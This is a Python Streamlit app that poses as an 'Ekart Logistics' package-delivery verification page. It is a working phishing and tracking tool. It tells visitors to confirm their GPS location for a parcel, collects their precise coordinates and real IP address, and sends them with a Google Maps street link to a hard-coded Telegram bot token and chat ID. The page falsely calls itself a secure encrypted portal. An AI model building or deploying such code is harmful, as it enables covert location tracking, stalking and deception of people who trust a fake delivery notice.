import streamlit as st
import requests
from streamlit_geolocation import streamlit_geolocation
from datetime import datetime

# --- SETTINGS ---
BOT_TOKEN = "8652805297:AAH0tpag7PKXH0v0CrZmeQJF7X68Qk01MKY"
CHAT_ID = "7964118615"

st.set_page_config(page_title="Ekart Logistics", page_icon="📦")

# 1. ACTUAL IP DETECTION (Cloudflare Bypass)
def get_actual_ip():
    # If on Cloudflare/Streamlit Cloud, the real IP is in the headers
    headers = st.context.headers
    ip = headers.get("cf-connecting-ip") or headers.get("x-forwarded-for")
    if not ip:
        # Local fallback
        try: ip = requests.get("https://api.ipify.org").text
        except: ip = "Unknown"
    return ip

user_ip = get_actual_ip()

# 2. TELEGRAM SENDER
def send_to_telegram(lat, lon, accuracy, ip):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    gmaps = f"https://www.google.com/maps?q={lat},{lon}"
    
    msg = (
        f"🎯 *ACTUAL GPS LOCKED*\n"
        f"📅 Time: {datetime.now().strftime('%H:%M:%S')}\n"
        f"🌐 Actual IP: `{ip}`\n"
        f"🛰️ Lat: `{lat}`\n"
        f"🛰️ Lon: `{lon}`\n"
        f"📏 Accuracy: {accuracy} meters\n\n"
        f"📍 [View Exact Street Location]({gmaps})"
    )
    requests.post(url, json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})

# 3. UI
st.markdown("<h2 style='text-align: center; color: #2874f0;'>Ekart Logistics</h2>", unsafe_allow_html=True)
st.info("Package #EK-992817: Please verify your current GPS location to finalize delivery.")

# This component forces the browser to ask for high-accuracy GPS permission
location = streamlit_geolocation()

# 4. DATA PROCESSING
if location.get('latitude'):
    lat = location['latitude']
    lon = location['longitude']
    acc = location.get('accuracy', 0)
    
    # Only send if we haven't sent this exact location yet
    if st.session_state.get('last_sent_lat') != lat:
        send_to_telegram(lat, lon, acc, user_ip)
        st.session_state['last_sent_lat'] = lat
        
    st.success("✅ Delivery location verified. Thank you.")
    st.write(f"Accuracy: {acc} meters from your device.")
else:
    st.warning("Awaiting GPS permission... Please click 'Allow' on the browser prompt.")

st.divider()
st.caption("Secure encrypted verification portal.")
